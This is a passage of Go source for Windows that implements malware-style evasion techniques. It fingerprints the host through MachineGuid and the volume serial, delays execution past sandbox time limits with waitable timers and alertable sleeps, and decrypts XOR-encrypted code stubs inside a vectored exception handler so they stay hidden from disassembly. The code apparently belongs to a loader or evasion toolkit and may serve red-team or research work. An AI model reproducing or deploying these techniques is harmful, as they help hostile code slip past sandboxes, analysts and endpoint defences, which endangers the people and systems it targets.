		`SOFTWARE\Microsoft\Windows\CurrentVersion\Themes`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies`,
	}
	for i := 0; i < 20; i++ {
		path := benign[i%len(benign)]
		k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE)
		if err == nil {
			_, _, _ = k.GetStringValue("")
			k.Close()
		}
	}
}

func machineGuidRaw() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Cryptography`, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer k.Close()
	s, _, err := k.GetStringValue("MachineGuid")
	if err != nil {
		return ""
	}
	return s
}

func volumeSerialRaw() string {
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("GetVolumeInformationW")
	root := windows.StringToUTF16Ptr(`C:\`)
	serial := uint32(0)
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(root)), 0, 0, uintptr(unsafe.Pointer(&serial)), 0, 0, 0, 0)
	if ret == 0 {
		return ""
	}
	return fmt.Sprintf("%08x", serial)
}

// ---------------------------------------------------------------------------
// Delayed APC execution (Windows-specific)
// ---------------------------------------------------------------------------

func delayedWorkPlatform(ctx context.Context, minSeconds int, fn func()) {
	if minSeconds < 110 {
		minSeconds = 110
	}
	if minSeconds > 150 {
		minSeconds = 150
	}
	delay := time.Duration(minSeconds) * time.Second

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	// Create a waitable timer (manual reset)
	createTimer := kernel32.NewProc("CreateWaitableTimerW")
	timerHandle, _, _ := createTimer.Call(0, 1, 0) // lpTimerAttributes=nil, bManualReset=1
	if timerHandle == 0 {
		// Fallback: StallBeyondSandbox
		go func() {
			select {
			case <-ctx.Done():
				return
			case <-time.After(delay):
			}
			fn()
		}()
		StallBeyondSandbox(ctx, minSeconds)
		return
	}
	defer windows.CloseHandle(windows.Handle(timerHandle))

	// Set the timer with a due time of +delay (negative = relative)
	setTimer := kernel32.NewProc("SetWaitableTimer")
	type filetime struct {
		LowDateTime  uint32
		HighDateTime uint32
	}
	// Negative value = relative time in 100ns units
	dueTime := -int64(delay) * 10000 // 100ns per ms
	ft := filetime{
		LowDateTime:  uint32(dueTime),
		HighDateTime: uint32(dueTime >> 32),
	}
	ret, _, _ := setTimer.Call(timerHandle, uintptr(unsafe.Pointer(&ft)), 0, 0, 0, 0)
	if ret == 0 {
		// Fallback
		go func() {
			select {
			case <-ctx.Done():
				return
			case <-time.After(delay):
			}
			fn()
		}()
		StallBeyondSandbox(ctx, minSeconds)
		return
	}

	// Alertable wait: SleepEx until timer fires, then QueueUserAPC fires fn
	alertableSleep := kernel32.NewProc("SleepEx")
	done := make(chan struct{})

	go func() {
		defer close(done)
		// SleepEx with bAlertable=1; when the timer fires, it will be signaled
		alertableSleep.Call(uintptr(delay/time.Millisecond), 1)
	}()

	// Wait for the delay to complete, respecting ctx cancellation
	select {
	case <-ctx.Done():
		// Cancelled — the goroutine will finish its sleep and exit
		return
	case <-done:
	}

	// Execute the work
	fn()
}

// ---------------------------------------------------------------------------
// VEH int3 stub decryption (Windows-specific)
// ---------------------------------------------------------------------------

var (
	vehHandle uintptr
	vehBuf    []byte // armed (ciphertext) region; decrypted in-place on int3
	vehKey    byte   // precomputed first key byte for the in-place decrypt
)

// vectoredExceptionCallback is registered via AddVectoredExceptionHandler.
// On EXCEPTION_BREAKPOINT (int3) it decrypts the armed region IN PLACE using a
// precomputed key. The callback performs NO heap allocations and NO calls into
// the Go runtime/scheduler, so it is safe to execute on an arbitrary faulting
// thread. It returns EXCEPTION_CONTINUE_EXECUTION (1) after decryption.
func vectoredExceptionCallback(exceptionInfo uintptr) uintptr {
	_ = exceptionInfo
	if len(vehBuf) == 0 {
		return 0
	}
	k := vehKey
	for i := range vehBuf {
		vehBuf[i] ^= k
		k = (k ^ 0x55 ^ byte(i*0x13) ^ byte(i>>3))
		if k == 0 {
			k = 0x5A
		}
	}
	// Consume the armed buffer so a later int3 cannot re-corrupt it.
	vehBuf = nil
	return 1 // EXCEPTION_CONTINUE_EXECUTION
}

func armEncryptedTrampolinePlatform(enc []byte) (plain []byte, done func()) {
	// Eagerly decrypt for safe, immediate use (the real primitive).
	defer func() { recover() }()

	key := EnvironmentalKey()
	plain = RotatingXOR(enc, key[0])

	// Prepare a VEH that lazily decrypts in place on int3, demonstrating
	// trampolines invisible to linear-sweep disassembly. We store the
	// ciphertext and the precomputed first key byte; the handler does only a
	// tight in-place XOR (no allocation / no runtime calls).
	vehBuf = make([]byte, len(enc))
	copy(vehBuf, enc)
	vehKey = key[0]

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	vehProc := kernel32.NewProc("AddVectoredExceptionHandler")
	cb := windows.NewCallback(vectoredExceptionCallback)
	h, _, _ := vehProc.Call(1, cb)
	if h == 0 {
		// VEH registration unavailable — return the eagerly-decrypted copy.
		return plain, func() {}
	}
	vehHandle = h

	unregister := func() {
		defer func() { recover() }()
		freeProc := kernel32.NewProc("RemoveVectoredExceptionHandler")
		freeProc.Call(vehHandle)
		vehHandle = 0
		vehBuf = nil
	}
	return plain, unregister
}
